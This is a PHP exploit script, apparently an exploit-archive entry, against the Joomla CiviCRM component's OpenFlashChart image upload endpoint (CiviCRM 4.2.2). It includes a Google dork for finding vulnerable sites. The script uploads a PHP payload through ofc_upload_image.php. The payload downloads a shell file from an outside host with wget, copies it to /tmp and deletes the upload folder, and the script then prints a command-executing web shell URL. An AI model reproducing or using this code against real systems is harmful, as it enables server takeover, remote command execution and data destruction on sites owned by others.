# Google Dork:"Index of /joomla/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart"
# Date: 20/04/2013
# Exploit Author: iskorpitx
# Vendor Homepage: http://civicrm.org
# Software Link: http://civicrm.org/blogs/yashodha/announcing-civicrm-422
# Version: [civicrm 4.2.2]
# Tested on: Win8 Pro x64 
# CVE : http://www.securityweb.org

<?php 
  
# Joomla component com_civicrm OpenFlashCart ofc_upload_image.php remote code injection exploit
# http://www.securityweb.org & http://www.security.biz.tr
# multithreading mass c:\appserv\www>exp.php -u http://target.com/ -f post.php
  
   
  
$options = getopt(&#039;u:f:&#039;); 
  
if(!isset($options[&#039;u&#039;], $options[&#039;f&#039;])) 
die("\n        Usage example: php jnews.php -u http://target.com/ -f post.php\n 
-u http://target.com/    The full path to Joomla! 
-f post.php             The name of the file to create.\n");  
  
$url     =  $options[&#039;u&#039;]; 
$file    =  $options[&#039;f&#039;]; 


$shell = "{$url}administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/{$file}"; 
$url   = "{$url}administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php?name={$file}"; 

  
$data      = &#039;<?php 
 system("wget http://www.securityweb.org/shell.txt; mv shell.txt post.php");
 system("cp post.php ../../../../../../../tmp/post.php");
 system("cd ..; rm -rf tmp-upload-images");
 echo "by iskorpitx" ; 
 fclose ( $handle ); 
 ?>&#039;; 
$headers = array(&#039;User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1&#039;, 
&#039;Content-Type: text/plain&#039;); 
  
  
echo "        [+] Submitting request to: {$options[&#039;u&#039;]}\n"; 
  
  
$handle = curl_init(); 
  
curl_setopt($handle, CURLOPT_URL, $url); 
curl_setopt($handle, CURLOPT_HTTPHEADER, $headers); 
curl_setopt($handle, CURLOPT_POSTFIELDS, $data); 
curl_setopt($handle, CURLOPT_RETURNTRANSFER, true); 
  
$source = curl_exec($handle); 
curl_close($handle); 
  
  
if(!strpos($source, &#039;Undefined variable: HTTP_RAW_POST_DATA&#039;) && @fopen($shell, &#039;r&#039;)) 
{ 
echo "        [+] Exploit completed successfully!\n"; 
echo "        ______________________________________________\n\n        {$shell}?cmd=system(&#039;id&#039;);\n"; 
} 
else
{ 
die("        [+] Exploit was unsuccessful.\n"); 
} 
   
?>

